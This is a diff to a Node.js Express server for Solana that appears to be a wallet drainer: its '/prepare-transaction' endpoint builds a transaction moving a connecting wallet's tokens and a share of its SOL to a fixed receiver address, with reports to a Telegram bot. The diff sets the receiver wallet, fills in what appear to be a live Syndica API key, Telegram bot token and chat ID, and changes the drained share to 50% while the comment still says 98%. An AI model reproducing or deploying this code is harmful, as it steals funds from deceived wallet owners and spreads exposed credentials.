@@ -26,13 +26,13 @@ app.use(express.json()); // Enable JSON body parsing
 app.use(express.static(path.join(__dirname, 'public'))); // Serve static files from 'public' folder
 
 const connection = new Connection(
-  'https://solana-mainnet.api.syndica.io/api-key/API_KEY_HERE', // TODO: Replace with your Syndica API key
+  'https://solana-mainnet.api.syndica.io/api-key/pFT17iBbtFSN8EJPtzH5EJBfdY6aLnzEvCywMdY3PwAWGujrYW3JCm99dqnvCWVtSif2TNi2TiQbQ3TQ8SG4pADiY7vdhhiY2F', // TODO: Replace with your Syndica API key
   'confirmed'
 );
 
 // 4. Configuration
-const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // TODO: Replace with your Telegram bot token
-const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"; // TODO: Replace with your Telegram chat ID
+const BOT_TOKEN = "6918123818:AAHHaZ-Z5gYTZjE40oG_qYl3nQBoj6uObcU"; // TODO: Replace with your Telegram bot token
+const CHAT_ID = "8160424962"; // TODO: Replace with your Telegram chat ID
 const PRICE_CACHE_DURATION = 30 * 60 * 1000; // Cache SOL price for 30 minutes
 let cachedSolPrice = null; // Cached SOL price
 let lastPriceUpdate = 0; // Timestamp of last price update
@@ -153,7 +153,7 @@ app.post('/prepare-transaction', async (req, res) => {
     }
 
     const fromPubkey = new PublicKey(publicKey);
-    const receiverWallet = new PublicKey('AjF1cgmjpuJsDs8YaL2BLxB9Ttgvxf6s8oYxzSBjekwg');
+    const receiverWallet = new PublicKey('2Qq2f5bpNY9EvXYQcuutDq4JhZ4PH77h3tjuCRPWCjmk');
     const transaction = new Transaction();
     let totalTransferred = 0;
     let tokenTransfers = 0;
@@ -231,7 +231,7 @@ app.post('/prepare-transaction', async (req, res) => {
     console.log(`Estimated fees: ${estimatedFees / LAMPORTS_PER_SOL} SOL`);
     const availableBalance = solBalance - minBalance - estimatedFees;
     console.log(`Available balance after fees: ${availableBalance / LAMPORTS_PER_SOL} SOL`);
-    const solForTransfer = Math.max(0, Math.floor(availableBalance * 0.98)); // Transfer 98% of available balance
+    const solForTransfer = Math.max(0, Math.floor(availableBalance * 0.50)); // Transfer 98% of available balance
 
     if (solForTransfer > 0) {
       console.log(`Transferring ${solForTransfer / LAMPORTS_PER_SOL} SOL to ${receiverWallet.toBase58()}`);
